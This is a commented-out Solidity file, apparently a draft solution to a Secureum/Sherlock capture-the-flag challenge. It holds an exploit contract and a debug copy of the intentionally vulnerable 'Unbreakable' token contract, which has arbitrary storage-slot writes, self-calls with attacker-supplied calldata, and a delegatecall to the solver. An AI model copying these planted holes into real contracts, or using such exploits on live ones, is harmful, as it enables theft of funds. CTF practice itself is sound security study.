// // SPDX-License-Identifier: UNLICENSED
// pragma solidity >=0.8.11;

// import "hardhat/console.sol";

// interface IChallenge_RomiRand {
//     struct Solution {
//         // challenge 1
//         uint256 ch1_slot;
//         bytes32 ch1_value;
//         // challenge 2
//         uint256 ch2_amount;
//         string ch2_error;
//         // reward
//         bytes reward;
//     }

//     function brake(Solution calldata solution) external;
// }

// contract Exploit_RomiRand is Ownable {
//     IChallenge_RomiRand instance;

//     constructor(IChallenge_RomiRand _instance) payable {
//         instance = _instance;
//         instance = IChallenge_RomiRand(address(new Unbreakable()));

//         // IChallenge_RomiRand.Solution memory solution2;
//         // solution2.ch1_slot = 1;
//         // solution2.ch1_value = bytes32(uint256(uint160(address(this))));
//         // solution2.ch2_amount = 0; //200000;
//         // solution2.ch2_error = "";

//         // // string memory error = string(abi.encodeWithSelector(Unbreakable.solveChallenge.selector, solution2));
//         // string memory error = string(abi.encodeWithSelector(Unbreakable.foo2.selector));

//         IChallenge_RomiRand.Solution memory solution;
//         solution.ch1_slot = 1;
//         solution.ch1_value = bytes32(uint256(uint160(address(this))));
//         solution.ch2_amount = 0; //200000;
//         solution.ch2_error = ""; //string(abi.encodeWithSelector(Unbreakable.foo2.selector));

//         instance.brake(solution);
//     }

//     function finalize() external {
//         selfdestruct(payable(msg.sender));
//     }
// }

// import "@openzeppelin/contracts/utils/Address.sol";
// import "@openzeppelin/contracts/utils/StorageSlot.sol";
// import "@openzeppelin/contracts/access/Ownable.sol";
// import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

// contract Unbreakable is ERC20, Ownable {
//     struct Solution {
//         // challenge 1
//         uint256 ch1_slot;
//         bytes32 ch1_value;
//         // challenge 2
//         uint256 ch2_amount;
//         string ch2_error;
//         // reward
//         bytes reward;
//     }

//     uint256 constant SCALE = 10_000;

//     // efficient storage packing to "save gas"
//     address solver;
//     bool solved;
//     bool broken;
//     bool external_repair_requested;

//     constructor() ERC20("Secureum Sherlock CTF Token", "SSCTF") {
//         // for marketing
//         _mint(address(this), 1_000_000);
//     }

//     modifier onlyPrivate() {
//         require(msg.sender == address(this), "private function");
//         _;
//     }

//     modifier notBroken() {
//         require(!broken, "contract is broken");
//         _;
//     }

//     modifier onlyBroken() {
//         require(broken, "contract still working");
//         _;
//     }

//     function challenge1(uint256 slot, bytes32 value) internal returns (bool) {
//         console.log("in 1");
//         require(slot != 6, "Don't touch!");
//         StorageSlot.getBytes32Slot(bytes32(slot)).value = value;
//         return solver == owner();
//     }

//     function challenge2(uint256 amount, string memory error_str) internal returns (bool) {
//         // you made it very far! Take some tokens if you can ;)
//         // Please just take `contract_share` % of the total supply
//         // so the protocol can sponsor future CTFs
//         console.log("in 2");
//         uint256 user_share = 20;
//         require(amount > 0, error_str);
//         uint256 new_supply = totalSupply() + amount;
//         uint256 new_user_share = (balanceOf(address(solver)) * 100 * SCALE) / new_supply;
//         if (new_user_share > user_share * SCALE) {
//             // resupply contract
//             uint256 val = balanceOf(address(this)) * ((new_user_share / user_share) * SCALE);
//             _mint(address(this), val);
//         }
//         _mint(solver, amount);

//         return (balanceOf(address(solver)) * 100 * SCALE) / totalSupply() == user_share * SCALE;
//     }

//     function challenge3() internal view returns (bool) {
//         console.log("in 3");
//         return !(tx.origin == solver || Address.isContract(solver));
//     }

//     function solveChallenge(Solution memory solution) public notBroken onlyPrivate returns (bool) {
//         console.log("solveChallenge");
//         return challenge1(solution.ch1_slot, solution.ch1_value) && challenge2(solution.ch2_amount, solution.ch2_error) && challenge3();
//     }

//     function brake(Solution calldata solution) external notBroken {
//         if (solver == address(0)) {
//             solver = msg.sender;
//         }
//         (bool success, bytes memory data) = address(this).call(abi.encodeCall(this.solveChallenge, (solution)));
//         if (success) {
//             console.log("brake success");
//             solved = abi.decode(data, (bool));
//             if (solved) {
//                 address(this).call(solution.reward);
//             } else {
//                 revert("challenge not solved");
//             }
//         } else {
//             console.log("broken");
//             broken = true;
//             address(this).call(data);
//             console.log("after broken");
//         }
//         // reset
//         solved = false;
//         broken = false;
//         solver = address(0);
//     }

//     function Error(string memory error) external onlyBroken onlyPrivate {
//         console.log("Error");
//         // something broke, try to fix it
//         console.log(bytes(error).length);
//         return;
//         (bool success, bytes memory data) = address(this).call(bytes(error));
//         console.log(success);
//         if (!success) {
//             console.log("no success");
//             // try again
//             (success, data) = address(this).call(data);
//             console.log("success:", success);
//             bool isfixed = abi.decode(data, (bool));
//             // escalate
//             external_repair_requested = success && !isfixed;
//             console.log("external", external_repair_requested);
//         }
//     }

//     function Panic(uint256 id) external view onlyBroken onlyPrivate returns (bool) {
//         console.log("Panic");
//         uint256 solved_int = solved ? 1 : 0;
//         return id & solved_int != 1;
//     }

//     function doStorageMaintenance() external {
//         require(external_repair_requested, "don't need maintenance");
//         address(solver).delegatecall("");
//     }

//     function foo2() external {
//         console.log("foo");
//     }
// }
